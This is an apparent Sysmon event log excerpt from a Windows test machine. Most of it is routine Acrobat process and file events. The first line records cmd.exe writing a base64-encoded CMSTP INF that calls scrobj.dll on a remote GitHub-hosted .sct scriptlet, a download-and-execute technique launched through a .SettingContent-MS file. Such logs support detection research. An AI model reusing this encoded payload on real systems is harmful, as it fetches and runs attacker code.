+CommandLine: "C:\Windows\System32\cmd.exe" /C echo W3ZlcnNpb25dClNpZ25hdHVyZT0kY2hpY2FnbyQKQWR2YW5jZWRJTkY9Mi41CgpbRGVmYXVsdEluc3RhbGxfU2luZ2xlVXNlcl0KVW5SZWdpc3Rlck9DWHM9VW5SZWdpc3Rlck9DWFNlY3Rpb24KCltVblJlZ2lzdGVyT0NYU2VjdGlvbl0KJTExJVxzY3JvYmouZGxsLE5JLGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9NYXJpYVZ1bGthbi9DTVNUUC9tYXN0ZXIvZHZwbi5zY3QKCltTdHJpbmdzXQpBcHBBY3QgPSAiU09GVFdBUkVcTWljcm9zb2Z0XENvbm5lY3Rpb24gTWFuYWdlciIKU2VydmljZU5hbWU9IkRWUE4iClNob3J0U3ZjTmFtZT0iRFZQTiIK &gt; %%APPDATA%%\tmp.b64
+CurrentDirectory: C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\
+User: WINDEV1910EVAL\User
+LogonGuid: {49926e27-fdfa-5dcc-0000-0020e1530300}
+LogonId: 0x353E1
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: MD5=4943BA1A9B41D69643F69685E35B2943,SHA256=6AEEA6272E1C304D1B8907B9258513AA27CF2F35F10B76365CA8567CABB70459
+ParentProcessGuid: {49926e27-1ee8-5dcd-0000-0010f7582a01}
+ParentProcessId: 5784
+ParentImage: C:\Users\User\AppData\Roaming\scmwrap.exe
+ParentCommandLine: "C:\Users\User\AppData\Roaming\scmwrap.exe" "C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\echo.SettingContent-MS"</Message><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:31:21.093975800Z'/><EventRecordID>37374</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:31:20.959</Data><Data Name='ProcessGuid'>{49926e27-1ee8-5dcd-0000-0010f7582a01}</Data><Data Name='ProcessId'>5784</Data><Data Name='Image'>C:\Users\User\AppData\Roaming\scmwrap.exe</Data><Data Name='FileVersion'>1.0.6781.17559</Data><Data Name='Description'>test1</Data><Data Name='Product'>test1</Data><Data Name='Company'>?</Data><Data Name='OriginalFileName'>scmwrap.exe</Data><Data Name='CommandLine'>"C:\Users\User\AppData\Roaming\scmwrap.exe" "C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\echo.SettingContent-MS"</Data><Data Name='CurrentDirectory'>C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\</Data><Data Name='User'>WINDEV1910EVAL\User</Data><Data Name='LogonGuid'>{49926e27-fdfa-5dcc-0000-0020e1530300}</Data><Data Name='LogonId'>0x353e1</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=C8459BCF5F36F7EFC628F24896E529FB,SHA256=15ACC8794F72021C3DB7DA73BB9D27324A182CF85DABE5EA107B87254C20FE90</Data><Data Name='ParentProcessGuid'>{49926e27-fe01-5dcc-0000-0010f9490400}</Data><Data Name='ParentProcessId'>3468</Data><Data Name='ParentImage'>C:\Windows\explorer.exe</Data><Data Name='ParentCommandLine'>C:\Windows\Explorer.EXE</Data></EventData><RenderingInfo Culture='en-US'><Message>Process Create:
+RuleName: 
+UtcTime: 2019-11-14 09:31:20.959
+ProcessGuid: {49926e27-1ee8-5dcd-0000-0010f7582a01}
+ProcessId: 5784
+Image: C:\Users\User\AppData\Roaming\scmwrap.exe
+FileVersion: 1.0.6781.17559
+Description: test1
+Product: test1
+Company: ?
+OriginalFileName: scmwrap.exe
+CommandLine: "C:\Users\User\AppData\Roaming\scmwrap.exe" "C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\echo.SettingContent-MS"
+CurrentDirectory: C:\Users\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\
+User: WINDEV1910EVAL\User
+LogonGuid: {49926e27-fdfa-5dcc-0000-0020e1530300}
+LogonId: 0x353E1
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: MD5=C8459BCF5F36F7EFC628F24896E529FB,SHA256=15ACC8794F72021C3DB7DA73BB9D27324A182CF85DABE5EA107B87254C20FE90
+ParentProcessGuid: {49926e27-fe01-5dcc-0000-0010f9490400}
+ParentProcessId: 3468
+ParentImage: C:\Windows\explorer.exe
+ParentCommandLine: C:\Windows\Explorer.EXE</Message><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:57.135447500Z'/><EventRecordID>37373</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:30:57.122</Data><Data Name='ProcessGuid'>{49926e27-1ebd-5dcd-0000-0010d3d32801}</Data><Data Name='ProcessId'>1288</Data><Data Name='Image'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\Acrobat.exe</Data><Data Name='TargetFilename'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\Data\CommonFiles\SLCache\Vjd7fUFjcm9iYXRDb250LTEyLVdpbi1HTXt8fQ==.slc</Data><Data Name='CreationUtcTime'>2019-11-14 09:30:57.122</Data></EventData><RenderingInfo Culture='en-US'><Message>File created:
+RuleName: 
+UtcTime: 2019-11-14 09:30:57.122
+ProcessGuid: {49926e27-1ebd-5dcd-0000-0010d3d32801}
+ProcessId: 1288
+Image: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\Acrobat.exe
+TargetFilename: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\Data\CommonFiles\SLCache\Vjd7fUFjcm9iYXRDb250LTEyLVdpbi1HTXt8fQ==.slc
+CreationUtcTime: 2019-11-14 09:30:57.122</Message><Level>Information</Level><Task>File created (rule: FileCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:57.124774700Z'/><EventRecordID>37372</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:30:57.122</Data><Data Name='ProcessGuid'>{49926e27-1ebd-5dcd-0000-0010d3d32801}</Data><Data Name='ProcessId'>1288</Data><Data Name='Image'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\Acrobat.exe</Data><Data Name='TargetFilename'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\Data\CommonFiles\SLCache\Vjd7fUFjcm9iYXRDb250LTEyLVdpbi1HTXt8fQ==.slc</Data><Data Name='CreationUtcTime'>2019-11-14 09:30:57.122</Data></EventData><RenderingInfo Culture='en-US'><Message>File created:
+RuleName: 
+UtcTime: 2019-11-14 09:30:57.122
+ProcessGuid: {49926e27-1ebd-5dcd-0000-0010d3d32801}
+ProcessId: 1288
+Image: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\Acrobat.exe
+TargetFilename: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\Data\CommonFiles\SLCache\Vjd7fUFjcm9iYXRDb250LTEyLVdpbi1HTXt8fQ==.slc
+CreationUtcTime: 2019-11-14 09:30:57.122</Message><Level>Information</Level><Task>File created (rule: FileCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:45.282771100Z'/><EventRecordID>37371</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:30:45.265</Data><Data Name='ProcessGuid'>{49926e27-1ec4-5dcd-0000-0010447d2901}</Data><Data Name='ProcessId'>6400</Data><Data Name='Image'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe</Data></EventData><RenderingInfo Culture='en-US'><Message>Process terminated:
+RuleName: 
+UtcTime: 2019-11-14 09:30:45.265
+ProcessGuid: {49926e27-1ec4-5dcd-0000-0010447d2901}
+ProcessId: 6400
+Image: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe</Message><Level>Information</Level><Task>Process terminated (rule: ProcessTerminate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:45.083327600Z'/><EventRecordID>37370</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:30:44.814</Data><Data Name='ProcessGuid'>{49926e27-1ec4-5dcd-0000-0010e47f2901}</Data><Data Name='ProcessId'>4112</Data><Data Name='Image'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe</Data><Data Name='FileVersion'>15.10.20056.167417</Data><Data Name='Description'>Adobe AcroCEF</Data><Data Name='Product'>Adobe AcroCEF</Data><Data Name='Company'>Adobe Systems Incorporated</Data><Data Name='OriginalFileName'>AcroCEF.exe</Data><Data Name='CommandLine'>"C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe" --type=renderer --disable-3d-apis --disable-databases --disable-direct-npapi-requests --disable-file-system --disable-notifications --disable-shared-workers --lang=en-US --lang=en-US --log-severity=disable --product-version="AcrobatServices/15.10.20056 Chrome/45.0.2454.85" --enable-pinch --device-scale-factor=1 --enable-delegated-renderer --num-raster-threads=1 --gpu-rasterization-msaa-sample-count=8 --content-image-texture-target=3553 --video-image-texture-target=3553 --channel="7864.1.739760481\2069956439" --allow-no-sandbox-job --font-cache-shared-handle=1716 /prefetch:673131151</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>WINDEV1910EVAL\User</Data><Data Name='LogonGuid'>{49926e27-fdfa-5dcc-0000-0020e1530300}</Data><Data Name='LogonId'>0x353e1</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Low</Data><Data Name='Hashes'>MD5=9D39D3E80E2B06B972E7FFD5D3AEE6F7,SHA256=B4A99607B1C293BA4340B50CD0446297525EA7CA54D76C679BBB0B29DF82D9D2</Data><Data Name='ParentProcessGuid'>{49926e27-1ec4-5dcd-0000-0010d6762901}</Data><Data Name='ParentProcessId'>7864</Data><Data Name='ParentImage'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe</Data><Data Name='ParentCommandLine'>"C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe"</Data></EventData><RenderingInfo Culture='en-US'><Message>Process Create:
+RuleName: 
+UtcTime: 2019-11-14 09:30:44.814
+ProcessGuid: {49926e27-1ec4-5dcd-0000-0010e47f2901}
+ProcessId: 4112
+Image: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe
+FileVersion: 15.10.20056.167417
+Description: Adobe AcroCEF
+Product: Adobe AcroCEF
+Company: Adobe Systems Incorporated
+OriginalFileName: AcroCEF.exe
+CommandLine: "C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe" --type=renderer --disable-3d-apis --disable-databases --disable-direct-npapi-requests --disable-file-system --disable-notifications --disable-shared-workers --lang=en-US --lang=en-US --log-severity=disable --product-version="AcrobatServices/15.10.20056 Chrome/45.0.2454.85" --enable-pinch --device-scale-factor=1 --enable-delegated-renderer --num-raster-threads=1 --gpu-rasterization-msaa-sample-count=8 --content-image-texture-target=3553 --video-image-texture-target=3553 --channel="7864.1.739760481\2069956439" --allow-no-sandbox-job --font-cache-shared-handle=1716 /prefetch:673131151
+CurrentDirectory: C:\Windows\system32\
+User: WINDEV1910EVAL\User
+LogonGuid: {49926e27-fdfa-5dcc-0000-0020e1530300}
+LogonId: 0x353E1
+TerminalSessionId: 1
+IntegrityLevel: Low
+Hashes: MD5=9D39D3E80E2B06B972E7FFD5D3AEE6F7,SHA256=B4A99607B1C293BA4340B50CD0446297525EA7CA54D76C679BBB0B29DF82D9D2
+ParentProcessGuid: {49926e27-1ec4-5dcd-0000-0010d6762901}
+ParentProcessId: 7864
+ParentImage: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe
+ParentCommandLine: "C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe"</Message><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:44.988437300Z'/><EventRecordID>37369</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:30:44.763</Data><Data Name='ProcessGuid'>{49926e27-1ec4-5dcd-0000-0010447d2901}</Data><Data Name='ProcessId'>6400</Data><Data Name='Image'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe</Data><Data Name='FileVersion'>15.10.20056.167417</Data><Data Name='Description'>Adobe AcroCEF</Data><Data Name='Product'>Adobe AcroCEF</Data><Data Name='Company'>Adobe Systems Incorporated</Data><Data Name='OriginalFileName'>AcroCEF.exe</Data><Data Name='CommandLine'>"C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe" --type=gpu-process --channel="7864.0.422840816\1288831834" --lang=en-US --log-severity=disable --product-version="AcrobatServices/15.10.20056 Chrome/45.0.2454.85" --supports-dual-gpus=false --gpu-driver-bug-workarounds=2,20,45 --gpu-vendor-id=0x80ee --gpu-device-id=0xbeef --gpu-driver-vendor="Oracle Corporation" --gpu-driver-version=6.0.10.0 --lang=en-US --log-severity=disable --product-version="AcrobatServices/15.10.20056 Chrome/45.0.2454.85" --allow-no-sandbox-job --ignored=" --type=renderer " /prefetch:822062411</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>WINDEV1910EVAL\User</Data><Data Name='LogonGuid'>{49926e27-fdfa-5dcc-0000-0020e1530300}</Data><Data Name='LogonId'>0x353e1</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Low</Data><Data Name='Hashes'>MD5=9D39D3E80E2B06B972E7FFD5D3AEE6F7,SHA256=B4A99607B1C293BA4340B50CD0446297525EA7CA54D76C679BBB0B29DF82D9D2</Data><Data Name='ParentProcessGuid'>{49926e27-1ec4-5dcd-0000-0010d6762901}</Data><Data Name='ParentProcessId'>7864</Data><Data Name='ParentImage'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe</Data><Data Name='ParentCommandLine'>"C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe"</Data></EventData><RenderingInfo Culture='en-US'><Message>Process Create:
+RuleName: 
+UtcTime: 2019-11-14 09:30:44.763
+ProcessGuid: {49926e27-1ec4-5dcd-0000-0010447d2901}
+ProcessId: 6400
+Image: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe
+FileVersion: 15.10.20056.167417
+Description: Adobe AcroCEF
+Product: Adobe AcroCEF
+Company: Adobe Systems Incorporated
+OriginalFileName: AcroCEF.exe
+CommandLine: "C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe" --type=gpu-process --channel="7864.0.422840816\1288831834" --lang=en-US --log-severity=disable --product-version="AcrobatServices/15.10.20056 Chrome/45.0.2454.85" --supports-dual-gpus=false --gpu-driver-bug-workarounds=2,20,45 --gpu-vendor-id=0x80ee --gpu-device-id=0xbeef --gpu-driver-vendor="Oracle Corporation" --gpu-driver-version=6.0.10.0 --lang=en-US --log-severity=disable --product-version="AcrobatServices/15.10.20056 Chrome/45.0.2454.85" --allow-no-sandbox-job --ignored=" --type=renderer " /prefetch:822062411
+CurrentDirectory: C:\Windows\system32\
+User: WINDEV1910EVAL\User
+LogonGuid: {49926e27-fdfa-5dcc-0000-0020e1530300}
+LogonId: 0x353E1
+TerminalSessionId: 1
+IntegrityLevel: Low
+Hashes: MD5=9D39D3E80E2B06B972E7FFD5D3AEE6F7,SHA256=B4A99607B1C293BA4340B50CD0446297525EA7CA54D76C679BBB0B29DF82D9D2
+ParentProcessGuid: {49926e27-1ec4-5dcd-0000-0010d6762901}
+ParentProcessId: 7864
+ParentImage: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe
+ParentCommandLine: "C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe"</Message><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:44.592155400Z'/><EventRecordID>37368</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:30:44.535</Data><Data Name='ProcessGuid'>{49926e27-1ec4-5dcd-0000-0010d6762901}</Data><Data Name='ProcessId'>7864</Data><Data Name='Image'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe</Data><Data Name='FileVersion'>15.10.20056.167417</Data><Data Name='Description'>Adobe AcroCEF</Data><Data Name='Product'>Adobe AcroCEF</Data><Data Name='Company'>Adobe Systems Incorporated</Data><Data Name='OriginalFileName'>AcroCEF.exe</Data><Data Name='CommandLine'>"C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe"</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>WINDEV1910EVAL\User</Data><Data Name='LogonGuid'>{49926e27-fdfa-5dcc-0000-0020e1530300}</Data><Data Name='LogonId'>0x353e1</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=9D39D3E80E2B06B972E7FFD5D3AEE6F7,SHA256=B4A99607B1C293BA4340B50CD0446297525EA7CA54D76C679BBB0B29DF82D9D2</Data><Data Name='ParentProcessGuid'>{49926e27-1ebd-5dcd-0000-0010d3d32801}</Data><Data Name='ParentProcessId'>1288</Data><Data Name='ParentImage'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\Acrobat.exe</Data><Data Name='ParentCommandLine'>"C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\Acrobat.exe" </Data></EventData><RenderingInfo Culture='en-US'><Message>Process Create:
+RuleName: 
+UtcTime: 2019-11-14 09:30:44.535
+ProcessGuid: {49926e27-1ec4-5dcd-0000-0010d6762901}
+ProcessId: 7864
+Image: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe
+FileVersion: 15.10.20056.167417
+Description: Adobe AcroCEF
+Product: Adobe AcroCEF
+Company: Adobe Systems Incorporated
+OriginalFileName: AcroCEF.exe
+CommandLine: "C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\AcroCEF\AcroCEF.exe"
+CurrentDirectory: C:\Windows\system32\
+User: WINDEV1910EVAL\User
+LogonGuid: {49926e27-fdfa-5dcc-0000-0020e1530300}
+LogonId: 0x353E1
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: MD5=9D39D3E80E2B06B972E7FFD5D3AEE6F7,SHA256=B4A99607B1C293BA4340B50CD0446297525EA7CA54D76C679BBB0B29DF82D9D2
+ParentProcessGuid: {49926e27-1ebd-5dcd-0000-0010d3d32801}
+ParentProcessId: 1288
+ParentImage: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\Acrobat.exe
+ParentCommandLine: "C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\Acrobat.exe" </Message><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:41.562979900Z'/><EventRecordID>37367</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:30:41.546</Data><Data Name='ProcessGuid'>{49926e27-1ebd-5dcd-0000-0010d3d32801}</Data><Data Name='ProcessId'>1288</Data><Data Name='Image'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\Acrobat.exe</Data><Data Name='TargetFilename'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\Data\CommonFiles\Adobe PCD\cache\F2E1E2A317BF</Data><Data Name='CreationUtcTime'>2019-11-14 08:01:55.092</Data></EventData><RenderingInfo Culture='en-US'><Message>File created:
+RuleName: 
+UtcTime: 2019-11-14 09:30:41.546
+ProcessGuid: {49926e27-1ebd-5dcd-0000-0010d3d32801}
+ProcessId: 1288
+Image: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\Acrobat.exe
+TargetFilename: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\Data\CommonFiles\Adobe PCD\cache\F2E1E2A317BF
+CreationUtcTime: 2019-11-14 08:01:55.092</Message><Level>Information</Level><Task>File created (rule: FileCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:41.450679200Z'/><EventRecordID>37366</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:30:41.437</Data><Data Name='ProcessGuid'>{49926e27-1ebd-5dcd-0000-0010d3d32801}</Data><Data Name='ProcessId'>1288</Data><Data Name='Image'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\Acrobat.exe</Data><Data Name='TargetFilename'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\Data\CommonFiles\Adobe PCD\cache\F2E1E2A317BF</Data><Data Name='CreationUtcTime'>2019-11-14 08:01:55.092</Data></EventData><RenderingInfo Culture='en-US'><Message>File created:
+RuleName: 
+UtcTime: 2019-11-14 09:30:41.437
+ProcessGuid: {49926e27-1ebd-5dcd-0000-0010d3d32801}
+ProcessId: 1288
+Image: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\Acrobat.exe
+TargetFilename: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\Data\CommonFiles\Adobe PCD\cache\F2E1E2A317BF
+CreationUtcTime: 2019-11-14 08:01:55.092</Message><Level>Information</Level><Task>File created (rule: FileCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:37.944142300Z'/><EventRecordID>37365</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='EventType'>CreateKey</Data><Data Name='UtcTime'>2019-11-14 09:30:37.890</Data><Data Name='ProcessGuid'>{49926e27-fe01-5dcc-0000-0010f9490400}</Data><Data Name='ProcessId'>3468</Data><Data Name='Image'>C:\Windows\Explorer.EXE</Data><Data Name='TargetObject'>HKU\S-1-5-21-3589201120-3083077123-1171929968-1001\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.pdf</Data></EventData><RenderingInfo Culture='en-US'><Message>Registry object added or deleted:
+RuleName: 
+EventType: CreateKey
+UtcTime: 2019-11-14 09:30:37.890
+ProcessGuid: {49926e27-fe01-5dcc-0000-0010f9490400}
+ProcessId: 3468
+Image: C:\Windows\Explorer.EXE
